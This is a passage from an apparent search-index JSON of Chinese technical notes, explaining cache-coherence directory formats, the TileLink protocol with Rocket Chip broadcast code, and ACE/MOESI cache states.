\u200b\u8868\u793a\u200b\u5bf9\u5e94\u200b\u7684\u200b\u6838\u5fc3\u200b\u4e2d\u6709\u200b\u8fd9\u4e2a\u200b\u7f13\u5b58\u200b\u884c\u200b\u3002\u200b\u4f46\u200b\u8fd9\u4e2a\u200b\u65b9\u6cd5\u200b\u4fdd\u5b58\u200b\u6570\u636e\u91cf\u200b\u592a\u200b\u5927\u200b\uff1a\u200b\u7f13\u5b58\u200b\u884c\u200b\u6570\u200b\u6b63\u6bd4\u200b\u4e8e\u200b N\uff0c\u200b\u8fd8\u8981\u200b\u518d\u200b\u4e58\u4ee5\u200b\u4e00\u6b21\u200b N\uff0c\u200b\u603b\u200b\u5bb9\u91cf\u200b\u662f\u200b \\(O(N^2)\\) \u200b\u7684\u200b\u3002</p> <p>\u200b\u4e00\u4e2a\u200b\u7a0d\u5fae\u200b\u597d\u200b\u4e00\u4e9b\u200b\u7684\u200b\u65b9\u6cd5\u200b\uff08Coarse bit vector format\uff09\u200b\u662f\u200b\uff0c\u200b\u6211\u200b\u628a\u200b\u6838\u5fc3\u200b\u5206\u7ec4\u200b\uff0c\u200b\u6bd4\u5982\u200b\u6309\u7167\u200b NUMA \u200b\u8282\u70b9\u200b\u8fdb\u884c\u200b\u5212\u5206\u200b\uff0c\u200b\u6b64\u65f6\u200b\u6bcf\u4e2a\u200b\u7f13\u5b58\u200b\u884c\u90fd\u200b\u4fdd\u5b58\u200b\u4e00\u4e2a\u200b\u5927\u5c0f\u200b\u4e3a\u200b M\uff08M \u200b\u4e3a\u200b NUMA \u200b\u6570\u91cf\u200b\uff09\u200b\u7684\u200b\u4f4d\u200b\u5411\u91cf\u200b\uff0c\u200b\u53ea\u8981\u200b\u8fd9\u4e2a\u200b NUMA \u200b\u8282\u70b9\u200b\u91cc\u200b\u6709\u200b\u8fd9\u4e2a\u200b\u7f13\u5b58\u200b\u884c\u200b\uff0c\u200b\u5bf9\u5e94\u200b\u4f4d\u200b\u5c31\u200b\u53d6\u200b 1\u3002\u200b\u8fd9\u6837\u200b\u76f8\u5f53\u4e8e\u200b\u662f\u200b\u4ee5\u200b\u727a\u7272\u200b\u4e00\u90e8\u5206\u200b\u6d41\u91cf\u200b\u4e3a\u200b\u4ee3\u4ef7\u200b\uff08NUMA \u200b\u8282\u70b9\u200b\u5185\u90e8\u200b\u5e7f\u64ad\u200b\uff09\uff0c\u200b\u6765\u200b\u8282\u7701\u200b\u4e00\u4e9b\u200b\u76ee\u5f55\u200b\u7684\u200b\u5b58\u50a8\u7a7a\u95f4\u200b\u3002</p> <p>\u200b\u4f46\u200b\u5b9e\u9645\u4e0a\u200b\uff0c\u200b\u901a\u5e38\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0c\u200b\u4e00\u4e2a\u200b\u7f13\u5b58\u200b\u884c\u200b\u901a\u5e38\u200b\u53ea\u4f1a\u200b\u5728\u200b\u5f88\u5c11\u200b\u7684\u200b\u6838\u5fc3\u200b\u4e2d\u200b\u4fdd\u5b58\u200b\uff0c\u200b\u6240\u4ee5\u200b\u8fd9\u91cc\u200b\u6709\u200b\u5f88\u5927\u200b\u7684\u200b\u4f18\u5316\u200b\u7a7a\u95f4\u200b\u3002\u200b\u6bd4\u5982\u8bf4\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u8bbe\u7f6e\u200b\u4e00\u4e2a\u200b\u7f13\u5b58\u200b\u884c\u200b\u540c\u65f6\u200b\u51fa\u73b0\u200b\u7684\u200b\u7f13\u5b58\u200b\u6570\u91cf\u200b\u4e0a\u9650\u200b\uff08Limited pointer format\uff09\uff0c\u200b\u7136\u540e\u200b\u4fdd\u5b58\u200b\u6838\u5fc3\u200b\u7684\u200b\u4e0b\u6807\u200b\u800c\u200b\u4e0d\u662f\u200b\u4f4d\u200b\u5411\u91cf\u200b\uff0c\u200b\u8fd9\u6837\u200b\u7684\u200b\u5b58\u50a8\u7a7a\u95f4\u200b\u5c31\u662f\u200b \\(O(N\\log_2N)\\)\u3002\u200b\u4f46\u662f\u200b\u5462\u200b\uff0c\u200b\u8fd9\u6837\u200b\u9650\u5236\u200b\u4e86\u200b\u7f13\u5b58\u200b\u884c\u200b\u540c\u65f6\u200b\u51fa\u73b0\u200b\u7684\u200b\u6b21\u6570\u200b\uff0c\u200b\u5982\u679c\u200b\u8d85\u8fc7\u200b\u4e86\u200b\u4e0a\u9650\u200b\uff0c\u200b\u9700\u8981\u200b\u66ff\u6362\u200b\u6389\u200b\u5df2\u6709\u200b\u7684\u200b\u7f13\u5b58\u200b\uff0c\u200b\u53ef\u80fd\u200b\u5728\u200b\u4e00\u4e9b\u200b\u573a\u666f\u200b\u4e0b\u200b\u6027\u80fd\u200b\u4f1a\u200b\u964d\u4f4e\u200b\u3002</p> <p>\u200b\u8fd8\u6709\u200b\u4e00\u79cd\u200b\u65b9\u5f0f\u200b\uff0c\u200b\u5c31\u662f\u200b\u94fe\u8868\u200b (Chained directory format)\u3002\u200b\u76ee\u5f55\u200b\u4e2d\u200b\u4fdd\u5b58\u200b\u6700\u540e\u200b\u4e00\u6b21\u200b\u8bbf\u95ee\u200b\u7684\u200b\u6838\u5fc3\u200b\u7f16\u53f7\u200b\uff0c\u200b\u7136\u540e\u200b\u6bcf\u4e2a\u200b\u6838\u5fc3\u200b\u7684\u200b\u7f13\u5b58\u200b\u91cc\u200b\uff0c\u200b\u4fdd\u5b58\u200b\u4e86\u200b\u4e0b\u200b\u4e00\u4e2a\u200b\u4fdd\u5b58\u200b\u4e86\u200b\u8fd9\u4e2a\u200b\u7f13\u5b58\u200b\u884c\u200b\u7684\u200b\u6838\u5fc3\u200b\u7f16\u53f7\u200b\uff0c\u200b\u6216\u8005\u200b\u8868\u793a\u200b\u94fe\u8868\u200b\u7ec8\u6b62\u200b\u3002\u200b\u8fd9\u6837\u200b\u5b58\u50a8\u7a7a\u95f4\u200b\u4e5f\u200b\u662f\u200b \\(O(N\\log_2N)\\)\uff0c\u200b\u4e0d\u8fc7\u200b\u53d1\u9001\u200b\u6d88\u606f\u200b\u7684\u200b\u5ef6\u8fdf\u200b\u66f4\u957f\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u8981\u200b\u4e32\u884c\u200b\u904d\u5386\u200b\u4e00\u904d\u200b\uff0c\u200b\u800c\u200b\u4e0d\u80fd\u200b\u540c\u65f6\u200b\u53d1\u9001\u200b\u3002\u200b\u7c7b\u4f3c\u200b\u5730\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u7528\u200b\u4e8c\u53c9\u6811\u200b\uff08Number-balanced binary tree format\uff09\u200b\u6765\u200b\u7ec4\u7ec7\u200b\uff1a\u200b\u6bcf\u4e2a\u200b\u7f13\u5b58\u200b\u4fdd\u5b58\u200b\u4e24\u4e2a\u200b\u6307\u9488\u200b\uff0c\u200b\u6307\u5411\u200b\u5de6\u5b50\u200b\u6811\u200b\u548c\u200b\u53f3\u5b50\u200b\u6811\u200b\uff0c\u200b\u7136\u540e\u200b\u5206\u522b\u200b\u904d\u5386\u200b\uff0c\u200b\u76ee\u7684\u200b\u8fd8\u662f\u200b\u52a0\u5feb\u200b\u904d\u5386\u200b\u7684\u200b\u901f\u5ea6\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u540c\u65f6\u200b\u53d1\u9001\u200b\u6d88\u606f\u200b\u7ed9\u200b\u591a\u4e2a\u200b\u6838\u5fc3\u200b\u3002</p>"},{"location":"hardware/cache_coherence_protocol.html#_4","title":"\u534f\u8bae\u200b\u5206\u6790","text":"<p>\u200b\u4e0b\u6587\u200b\u7ed3\u5408\u5b9e\u9645\u200b\u7684\u200b\u534f\u8bae\u200b\uff0c\u200b\u5206\u6790\u200b\u7f13\u5b58\u200b\u4e00\u81f4\u6027\u200b\u534f\u8bae\u200b\u662f\u200b\u5982\u4f55\u200b\u5728\u200b\u786c\u4ef6\u200b\u4e2d\u200b\u5b9e\u73b0\u200b\u7684\u200b\u3002</p>"},{"location":"hardware/cache_coherence_protocol.html#tilelink","title":"TileLink \u200b\u534f\u8bae","text":"<p>TileLink \u200b\u4e3a\u4e86\u200b\u5b9e\u73b0\u200b\u7f13\u5b58\u200b\u4e00\u81f4\u6027\u200b\uff0c\u200b\u5728\u200b\u5df2\u6709\u200b\u7684\u200b A \u200b\u548c\u200b D channel \u200b\u4ee5\u5916\u200b\uff0c\u200b\u5b83\u200b\u5f15\u5165\u200b\u4e86\u200b\u4e09\u4e2a\u200b channel\uff1aB\u3001C \u200b\u548c\u200b E\uff0c\u200b\u652f\u6301\u200b\u4e09\u79cd\u200b\u64cd\u4f5c\u200b\uff1a</p> <ul> <li>Acquire\uff1aM-&gt;S \u200b\u5728\u200b A channel \u200b\u4e0a\u200b\u53d1\u9001\u200b Acquire\uff0cS-&gt;M \u200b\u5728\u200b D channel \u200b\u4e0a\u200b\u53d1\u9001\u200b Grant\uff0c\u200b\u7136\u540e\u200b M-&gt;S \u200b\u5728\u200b E channel \u200b\u4e0a\u200b\u53d1\u9001\u200b GrantAck\uff1b\u200b\u529f\u80fd\u200b\u662f\u200b\u83b7\u53d6\u200b\u4e00\u4e2a\u200b copy\uff0c\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u8fd9\u4e2a\u200b\u548c\u200b Get \u200b\u662f\u200b\u7c7b\u4f3c\u200b\u7684\u200b\uff0c\u200b\u90fd\u200b\u662f\u200b\u5728\u200b A channel \u200b\u4e0a\u200b\u53d1\u9001\u200b\u8bf7\u6c42\u200b\uff0c\u200b\u5728\u200b D channel \u200b\u4e0a\u200b\u63a5\u53d7\u200b\u54cd\u5e94\u200b\uff0c\u200b\u53ea\u4e0d\u8fc7\u200b\u989d\u5916\u200b\u9700\u8981\u200b\u5728\u200b E channel \u200b\u4e0a\u200b\u53d1\u9001\u200b GrantAck\u3002</li> <li>Release\uff1aM-&gt;S \u200b\u5728\u200b C channel \u200b\u4e0a\u200b\u53d1\u9001\u200b Release/ReleaseData\uff0cS-&gt;M \u200b\u5728\u200b D channel \u200b\u4e0a\u200b\u53d1\u9001\u200b ReleaseAck\uff1b\u200b\u529f\u80fd\u200b\u662f\u200b\u5220\u9664\u200b\u81ea\u5df1\u200b\u7684\u200b copy\uff0c\u200b\u4e00\u822c\u200b\u662f\u200b\u7f13\u5b58\u200b\u884c\u8981\u200b\u88ab\u200b\u6362\u200b\u51fa\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5982\u679c\u200b\u8981\u200b\u5199\u200b\u56de\u200b Dirty \u200b\u6570\u636e\u200b\uff0c\u200b\u5c31\u200b\u7528\u200b ReleaseData\uff0c\u200b\u5426\u5219\u200b\u7528\u200b Release</li> <li>Probe\uff1aS-&gt;M \u200b\u5728\u200b B channel \u200b\u4e0a\u200b\u53d1\u9001\u200b Probe\uff0cM-&gt;S \u200b\u5728\u200b C channel \u200b\u4e0a\u200b\u53d1\u9001\u200b ProbeAck\uff1b\u200b\u529f\u80fd\u200b\u662f\u200b\u8981\u6c42\u200b M \u200b\u5220\u9664\u200b\u81ea\u5df1\u200b\u7684\u200b copy\uff0c\u200b\u901a\u5e38\u200b\u662f\u200b\u6709\u200b\u67d0\u200b\u4e00\u4e2a\u200b\u7f13\u5b58\u200b\u53d1\u9001\u200b\u4e86\u200b Acquire\uff0c\u200b\u5bfc\u81f4\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u9700\u8981\u200b\u964d\u4f4e\u200b\u6743\u9650\u200b</li> </ul> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0cA C E \u200b\u4e09\u4e2a\u200b channel \u200b\u662f\u200b M-&gt;S\uff0cB D \u200b\u4e24\u4e2a\u200b channel \u200b\u662f\u200b S-&gt;M\u3002</p> <p>\u200b\u5047\u5982\u200b\u4e00\u4e2a\u200b\u7f13\u5b58\u200b\uff08Master A\uff09\u200b\u8981\u200b\u5199\u5165\u200b\u4e00\u5757\u200b\u53ea\u8bfb\u200b\u6570\u636e\u200b\uff0c\u200b\u6216\u8005\u200b\u8bfb\u53d6\u200b\u4e00\u5757\u200b miss \u200b\u7684\u200b\u7f13\u5b58\u200b\u884c\u200b\uff0c\u200b\u5982\u679c\u200b\u662f\u200b\u5e7f\u64ad\u5f0f\u200b\u7684\u200b\u7f13\u5b58\u200b\u4e00\u81f4\u6027\u200b\u534f\u8bae\u200b\uff0c\u200b\u90a3\u4e48\u200b\u9700\u8981\u200b\u7ecf\u5386\u200b\u5982\u4e0b\u200b\u7684\u200b\u8fc7\u7a0b\u200b\uff1a</p> <ul> <li>Master A -&gt; Slave: Acquire</li> <li>Slave -&gt; Master B: Probe</li> <li>Master B -&gt; Slave: ProbeAck</li> <li>Slave -&gt; Master A: Grant</li> <li>Master A -&gt; Slave: GrantAck</li> </ul> <p>\u200b\u9996\u5148\u200b Master A \u200b\u53d1\u51fa\u200b Acquire \u200b\u8bf7\u6c42\u200b\uff0c\u200b\u7136\u540e\u200b Slave \u200b\u5411\u200b\u5176\u4ed6\u200b Master \u200b\u5e7f\u64ad\u200b Probe\uff0c\u200b\u7b49\u5230\u200b\u5176\u4ed6\u200b Master \u200b\u8fd4\u56de\u200b ProbeAck \u200b\u540e\u200b\uff0c\u200b\u518d\u200b\u5411\u200b Master A \u200b\u8fd4\u56de\u200b Grant\uff0c\u200b\u6700\u540e\u200b Master A \u200b\u53d1\u9001\u200b GrantAck \u200b\u7ed9\u200b Slave\u3002\u200b\u8fd9\u6837\u200b Master A \u200b\u5c31\u200b\u83b7\u5f97\u200b\u4e86\u200b\u8fd9\u4e2a\u200b\u7f13\u5b58\u200b\u884c\u200b\u7684\u200b\u4e00\u4efd\u200b\u62f7\u8d1d\u200b\uff0c\u200b\u5e76\u4e14\u200b\u8ba9\u200b Master B \u200b\u7684\u200b\u7f13\u5b58\u200b\u884c\u200b\u5931\u6548\u200b\u6216\u8005\u200b\u72b6\u6001\u200b\u53d8\u6210\u200b\u53ea\u8bfb\u200b\u3002</p> <p>TileLink \u200b\u7684\u200b\u7f13\u5b58\u200b\u884c\u6709\u200b\u4e09\u4e2a\u200b\u72b6\u6001\u200b\uff1aNone\uff0cBranch \u200b\u548c\u200b Trunk(Tip)\u3002\u200b\u57fa\u672c\u200b\u5bf9\u5e94\u200b MSI \u200b\u6a21\u578b\u200b\uff1aNone-&gt;Invalid\uff0cBranch-&gt;Shared \u200b\u548c\u200b Trunk-&gt;Modified\u3002Rocket Chip \u200b\u4ee3\u7801\u200b\u4e2d\u200b ClientStates \u200b\u8fd8\u200b\u5b9a\u4e49\u200b\u4e86\u200b Dirty \u200b\u72b6\u6001\u200b\uff0c\u200b\u5927\u81f4\u200b\u5bf9\u5e94\u200b MESI \u200b\u6a21\u578b\u200b\uff1aNone-&gt;Invalid\uff0cBranch-&gt;Shared\uff0cTrunk-&gt;Exclusive\uff0cDirty-&gt;Modified\u3002</p> <p>\u200b\u6b64\u5916\u200b\uff0c\u200b\u6807\u51c6\u200b\u8fd8\u200b\u8bf4\u200b\u53ef\u4ee5\u200b\u5728\u200b B \u200b\u548c\u200b C channel \u200b\u4e0a\u200b\u8fdb\u884c\u200b TL-UH \u200b\u7684\u200b\u64cd\u4f5c\u200b\u3002\u200b\u6807\u51c6\u200b\u8fd9\u4e48\u200b\u8bbe\u8ba1\u200b\u7684\u200b\u610f\u56fe\u200b\u662f\u200b\u53ef\u4ee5\u200b\u8ba9\u200b Slave \u200b\u8f6c\u53d1\u200b\u64cd\u4f5c\u200b\u5230\u200b\u62e5\u6709\u200b\u7f13\u5b58\u6570\u636e\u200b\u7684\u200b Master \u200b\u4e0a\u200b\u3002\u200b\u6bd4\u5982\u200b Master A \u200b\u5728\u200b A channel \u200b\u4e0a\u200b\u53d1\u9001\u200b Put \u200b\u8bf7\u6c42\u200b\uff0c\u200b\u90a3\u4e48\u200b Slave \u200b\u5411\u200b Master B \u200b\u7684\u200b B channel \u200b\u4e0a\u200b\u53d1\u9001\u200b Put \u200b\u8bf7\u6c42\u200b\uff0cMaster B \u200b\u5728\u200b C channel \u200b\u4e0a\u200b\u53d1\u9001\u200b AccessAck \u200b\u54cd\u5e94\u200b\uff0cSlave \u200b\u518d\u200b\u628a\u200b\u54cd\u5e94\u200b\u8f6c\u56de\u200b Master A \u200b\u7684\u200b D channel\u3002\u200b\u8fd9\u200b\u5c31\u200b\u50cf\u662f\u200b\u4e00\u4e2a\u200b\u7247\u4e0a\u200b\u7684\u200b\u7f51\u7edc\u200b\uff0cSlave \u200b\u8d1f\u8d23\u200b\u5728\u200b Master \u200b\u4e4b\u95f4\u200b\u8def\u7531\u200b\u8bf7\u6c42\u200b\u3002</p> <p>\u200b\u63a5\u4e0b\u6765\u200b\u770b\u200b Rocket Chip \u200b\u81ea\u5e26\u200b\u7684\u200b\u57fa\u4e8e\u200b\u5e7f\u64ad\u200b\u7684\u200b\u7f13\u5b58\u200b\u4e00\u81f4\u6027\u200b\u534f\u8bae\u200b\u5b9e\u73b0\u200b\u3002\u200b\u6838\u5fc3\u200b\u5b9e\u73b0\u200b\u662f\u200b TLBroadcast\uff0c\u200b\u6838\u5fc3\u200b\u7684\u200b\u903b\u8f91\u200b\u5c31\u662f\u200b\uff0c\u200b\u5982\u679c\u200b\u4e00\u4e2a\u200b Master A \u200b\u53d1\u9001\u200b\u4e86\u200b Acquire\uff0c\u200b\u90a3\u4e48\u200b TLBroadcast \u200b\u9700\u8981\u200b\u53d1\u9001\u200b Probe \u200b\u5230\u200b\u5176\u4ed6\u200b\u7684\u200b Master\uff0c\u200b\u5f53\u200b\u5176\u4ed6\u200b\u7684\u200b Master \u200b\u90fd\u200b\u54cd\u5e94\u200b\u4e86\u200b ProbeAck \u200b\u540e\u200b\uff0c\u200b\u518d\u200b\u8fd4\u56de\u200b Grant \u200b\u5230\u200b Master A\u3002</p> <p>\u200b\u9996\u5148\u200b\u6765\u770b\u200b B channel \u200b\u4e0a\u200b\u7684\u200b Probe \u200b\u903b\u8f91\u200b\u3002\u200b\u5b83\u200b\u8bb0\u5f55\u200b\u4e86\u200b\u4e00\u4e2a\u200b todo bitmask\uff0c\u200b\u8868\u793a\u200b\u54ea\u4e9b\u200b Master \u200b\u9700\u8981\u200b\u53d1\u9001\u200b Probe\uff0c\u200b\u8fd9\u91cc\u200b\u91c7\u7528\u200b\u4e86\u200b Probe Filter \u200b\u6765\u200b\u51cf\u5c11\u200b\u53d1\u9001\u200b Probe \u200b\u7684\u200b\u6b21\u6570\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u53ea\u200b\u9700\u8981\u200b\u5411\u200b\u62e5\u6709\u200b\u8fd9\u4e2a\u200b\u7f13\u5b58\u200b\u884c\u200b\u7684\u200b Master \u200b\u53d1\u9001\u200b Probe\uff1a</p> <pre><code>val probe_todo = RegInit(0.U(max(1, caches.size).W))\nval probe_line = Reg(UInt())\nval probe_perms = Reg(UInt(2.W))\nval probe_next = probe_todo &amp; ~(leftOR(probe_todo) &lt;&lt; 1)\nval probe_busy = probe_todo.orR()\nval probe_target = if (caches.size == 0) 0.U else Mux1H(probe_next, cache_targets)\n\n// Probe whatever the FSM wants to do next\nin.b.valid := probe_busy\nif (caches.size != 0) {\n    in.b.bits := edgeIn.Probe(probe_line &lt;&lt; lineShift, probe_target, lineShift.U, probe_perms)._2\n}\nwhen (in.b.fire()) { probe_todo := probe_todo &amp; ~probe_next }\n</code></pre> <p>\u200b\u8fd9\u91cc\u200b <code>probe_next</code> \u200b\u5c31\u662f\u200b\u88ab\u200b probe \u200b\u7684\u200b\u90a3\u4e2a\u200b Master \u200b\u5bf9\u5e94\u200b\u7684\u200b bitmask\uff0c<code>probe_target</code> \u200b\u5c31\u662f\u200b Master \u200b\u7684\u200b Id\u3002\u200b\u8fd9\u4e2a\u200b Probe FSM \u200b\u7684\u200b\u8f93\u5165\u200b\u5c31\u662f\u200b Probe Filter\uff0c\u200b\u5b83\u4f1a\u200b\u7ed9\u51fa\u200b\u54ea\u4e9b\u200b Cache \u200b\u62e5\u6709\u200b\u5f53\u524d\u200b\u7684\u200b\u7f13\u5b58\u200b\u884c\u200b\u7684\u200b\u4fe1\u606f\u200b\uff1a</p> <pre><code>val leaveB = !filter.io.response.bits.needT &amp;&amp; !filter.io.response.bits.gaveT\nval others = filter.io.response.bits.cacheOH &amp; ~filter.io.response.bits.allocOH\nval todo = Mux(leaveB, 0.U, others)\nfilter.io.response.ready := !probe_busy\nwhen (filter.io.response.fire()) {\n    probe_todo  := todo\n    probe_line  := filter.io.response.bits.address &gt;&gt; lineShift\n    probe_perms := Mux(filter.io.response.bits.needT, TLPermissions.toN, TLPermissions.toB)\n}\n</code></pre> <p>\u200b\u8fd9\u91cc\u200b\u53c8\u200b\u533a\u5206\u200b\u4e24\u79cd\u200b\u60c5\u51b5\u200b\uff1a\u200b\u5982\u679c\u200b Acquire \u200b\u9700\u8981\u200b\u8fdb\u5165\u200b Trunk \u200b\u72b6\u6001\u200b\uff08\u200b\u6bd4\u5982\u200b\u662f\u200b\u4e2a\u200b\u5199\u5165\u200b\u64cd\u4f5c\u200b\uff09\uff0c\u200b\u610f\u5473\u7740\u200b\u5176\u4ed6\u200b Master \u200b\u9700\u8981\u200b\u8fdb\u5165\u200b None \u200b\u72b6\u6001\u200b\uff0c\u200b\u6240\u4ee5\u200b\u8fd9\u91cc\u200b\u8981\u200b\u53d1\u9001\u200b toN\uff1b\u200b\u5982\u679c\u200b Acquire \u200b\u4e0d\u200b\u9700\u8981\u200b\u8fdb\u5165\u200b Trunk \u200b\u72b6\u6001\u200b\uff08\u200b\u6bd4\u5982\u200b\u662f\u200b\u4e2a\u200b\u8bfb\u53d6\u200b\u64cd\u4f5c\u200b\uff09\uff0c\u200b\u90a3\u4e48\u200b\u53ea\u200b\u9700\u8981\u200b\u5176\u4ed6\u200b Master \u200b\u8fdb\u5165\u200b Branch \u200b\u72b6\u6001\u200b\uff0c\u200b\u6240\u4ee5\u200b\u8fd9\u91cc\u200b\u8981\u200b\u53d1\u9001\u200b toB\u3002</p> <p>\u200b\u5728\u200b B channel \u200b\u53d1\u9001\u200b Probe \u200b\u7684\u200b\u540c\u65f6\u200b\uff0c\u200b\u4e5f\u200b\u8981\u200b\u5904\u7406\u200b C channel \u200b\u4e0a\u200b\u7684\u200b ProbeAck \u200b\u548c\u200b ProbeAckData\uff1a</p> <pre><code>// Incoming C can be:\n// ProbeAck     =&gt; decrement tracker, drop \n// ProbeAckData =&gt; decrement tracker, send out A as PutFull(DROP)\n// ReleaseData  =&gt;                    send out A as PutFull(TRANSFORM)\n// Release      =&gt; send out D as ReleaseAck\n</code></pre> <p>\u200b\u7531\u4e8e\u200b\u8fd9\u91cc\u200b\u91c7\u7528\u200b\u7684\u200b\u662f\u200b invalidation based\uff0c\u200b\u6240\u4ee5\u200b\u5982\u679c\u200b\u67d0\u4e2a\u200b Master \u200b\u4e4b\u524d\u200b\u5904\u4e8e\u200b Dirty \u200b\u72b6\u6001\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5b83\u4f1a\u200b\u53d1\u9001\u200b ProbeAckData\uff0c\u200b\u6b64\u65f6\u200b\u9700\u8981\u200b\u628a\u200b\u6570\u636e\u200b\u5199\u56de\u200b\uff0c\u200b\u6240\u4ee5\u200b\u9700\u8981\u200b\u7528\u200b PutFull \u200b\u628a\u200b\u6570\u636e\u200b\u5199\u51fa\u53bb\u200b\u3002</p>"},{"location":"hardware/cache_coherence_protocol.html#ace","title":"ACE \u200b\u534f\u8bae","text":"<p>ACE \u200b\u5728\u200b AXI \u200b\u534f\u8bae\u200b\u7684\u200b\u57fa\u7840\u200b\u4e0a\u200b\uff0c\u200b\u5b9e\u73b0\u200b\u4e86\u200b\u7f13\u5b58\u200b\u4e00\u81f4\u6027\u200b\u534f\u8bae\u200b\u3002\u200b\u9996\u5148\u200b\u5217\u51fa\u200b ACE \u200b\u7684\u200b\u7f13\u5b58\u200b\u72b6\u6001\u200b\u6a21\u578b\u200b\uff0c\u200b\u5b83\u200b\u5b9a\u4e49\u200b\u4e86\u200b\u8fd9\u4e48\u200b\u4e94\u79cd\u200b\u72b6\u6001\u200b\uff0c\u200b\u5176\u5b9e\u200b\u5c31\u662f\u200b MOESI \u200b\u7684\u200b\u4e0d\u540c\u200b\u8bf4\u6cd5\u200b\uff1a</p> <ol> <li>UniqueDirty: Modified</li> <li>SharedDirty: Owned</li> <li>UniqueClean: Exclusive</li> <li>SharedClean: Shared</li> <li>Invalid: Invalid</li> </ol> <p>\u200b\u6587\u6863\u200b\u4e2d\u200b\u7684\u200b\u5b9a\u4e49\u200b\u5982\u4e0b\u200b\uff1a</p> <ul> <li>Valid, Invalid: When valid, the cache line is present in the cache. When invalid, the cache line is not present in the cache.</li> <li>Unique, Shared: When unique, the cache line exists only in one cache. When shared, the cache line might exist in more than one cache, but this is not guaranteed.</li> <li>Clean, Dirty: When clean, the cache does not have responsibility for updating main memory. When dirty, the cache line has been modified with respect to main memory, and this cache must ensure that main memory is eventually updated.</li> </ul> <p>\u200b\u5927\u81f4\u200b\u7406\u89e3\u200b\u7684\u8bdd\u200b\uff0cUnique \u200b\u8868\u793a\u200b\u53ea\u6709\u200b\u4e00\u4e2a\u200b\u7f13\u5b58\u200b\u6709\u200b\u8fd9\u4e2a\u200b\u7f13\u5b58\u200b\u884c\u200b\uff0cShared \u200b\u8868\u793a\u200b\u6709\u200b\u53ef\u80fd\u200b\u6709\u200b\u591a\u4e2a\u200b\u7f13\u5b58\u200b\u6709\u200b\u8fd9\u4e2a\u200b\u7f13\u5b58\u200b\u884c\u200b\uff1bClean \u200b\u8868\u793a\u200b\u5b83\u200b\u4e0d\u200b\u8d1f\u8d23\u200b\u66f4\u65b0\u200b\u5185\u5b58\u200b\uff0cDirty \u200b\u8868\u793a\u200b\u5b83\u200b\u8d1f\u8d23\u200b\u66f4\u65b0\u200b\u5185\u5b58\u200b\u3002\u200b\u4e0b\u9762\u200b\u7684\u200b\u5f88\u591a\u200b\u64cd\u4f5c\u200b\u90fd\u200b\u662f\u200b\u56f4\u7ed5\u200b\u8fd9\u4e9b\u200b\u72b6\u6001\u200b\u8fdb\u884c\u200b\u7684\u200b\u3002</p> <p>\u200b\u6587\u6863\u200b\u4e2d\u200b\u4e5f\u200b\u8bf4\u200b\uff0c\u200b\u5b83\u200b\u652f\u6301\u200b MOESI \u200b\u7684\u200b\u4e0d\u540c\u200b\u5b50\u96c6\u200b\uff1aMESI, ESI, MEI, MOESI\uff0c\u200b\u6240\u4ee5\u200b\u4e5f\u8bb8\u200b\u5728\u200b\u4e00\u4e2a\u200b\u7b80\u5316\u200b\u7684\u200b\u7cfb\u7edf\u200b\u91cc\u200b\uff0c\u200b\u4e00\u4e9b\u200b\u72b6\u6001\u200b\u53ef\u4ee5\u200b\u4e0d\u200b\u5b58\u5728\u200b\uff0c\u200b\u5b9e\u73b0\u200b\u4f1a\u200b\u6709\u6240\u4e0d\u540c\u200b\u3002</p> <p>\u200b\u6362\u4f4d\u200b\u601d\u8003\u200b\uff0c\u200b\u4f5c\u4e3a\u200b\u534f\u8bae\u200b\u7684\u200b\u8bbe\u8ba1\u8005\u200b\uff0c\u200b\u5e94\u8be5\u200b\u5982\u4f55\u200b\u6dfb\u52a0\u200b\u4fe1\u53f7\u200b\u6765\u200b\u5b9e\u73b0\u200b\u7f13\u5b58\u200b\u4e00\u81f4\u6027\u200b\u534f\u8bae\u200b\uff1f\u200b\u4ece\u200b\u9700\u6c42\u200b\u51fa\u53d1\u200b\uff0c\u200b\u7f13\u5b58\u200b\u4e00\u81f4\u6027\u200b\u534f\u8bae\u200b\u9700\u8981\u200b\u5b9e\u73b0\u200b\uff1a</p> <ol> <li>\u200b\u8bfb\u200b\u6216\u200b\u5199\u200b miss \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u9700\u8981\u200b\u8bf7\u6c42\u200b\u8fd9\u4e2a\u200b\u7f13\u5b58\u200b\u884c\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u5e76\u4e14\u200b\u66f4\u65b0\u200b\u81ea\u5df1\u200b\u7684\u200b\u72b6\u6001\u200b\uff0c\u200b\u6bd4\u5982\u200b\u8bfb\u53d6\u200b\u5230\u200b Shared\uff0c\u200b\u5199\u5165\u200b\u5230\u200b Modified \u200b\u7b49\u200b\u3002</li> <li>\u200b\u5199\u5165\u200b\u4e00\u4e2a\u200b valid &amp;&amp; !dirty \u200b\u7684\u200b\u7f13\u5b58\u200b\u884c\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u9700\u8981\u200b\u5347\u7ea7\u200b\u81ea\u5df1\u200b\u7684\u200b\u72b6\u6001\u200b\uff0c\u200b\u6bd4\u5982\u200b\u4ece\u200b Shared \u200b\u5230\u200b Modified\u3002</li> <li>\u200b\u9700\u8981\u200b evict \u200b\u4e00\u4e2a\u200b valid &amp;&amp; dirty \u200b\u7684\u200b\u7f13\u5b58\u200b\u884c\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u9700\u8981\u200b\u628a\u200b dirty \u200b\u6570\u636e\u200b\u5199\u56de\u200b\uff0c\u200b\u5e76\u4e14\u200b\u964d\u7ea7\u200b\u81ea\u5df1\u200b\u7684\u200b\u72b6\u6001\u200b\uff0c\u200b\u6bd4\u5982\u200b Modified -&gt; Shared/Invalid\u3002\u200b\u5982\u679c\u200b\u9700\u8981\u200b evict \u200b\u4e00\u4e2a\u200b valid &amp;&amp; !dirty 